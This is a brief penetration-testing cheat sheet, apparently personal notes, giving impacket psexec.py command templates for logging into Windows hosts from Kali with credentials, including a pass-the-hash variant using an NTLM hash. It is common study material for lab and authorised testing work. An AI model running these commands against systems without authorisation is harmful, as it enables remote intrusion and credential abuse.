> To login from kali (if you have issues with pasting commands try impacket-psexec):

If we need to specify the domain:

```
rlwrap psexec.py <domain>/<user>:<pass>@<ip>  
```

> If specifying the domain dosent work consider specifying the computer as well as seen below:

```
psexec.py <hostname>.<domain>/<user>:<pass>@<ip>  
```

> No domain specification:

```
rlwrap psexec.py <user>:<pass>@<ip>  
```

> If you have a hash:

```
psexec.py -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<target_ip> 
```

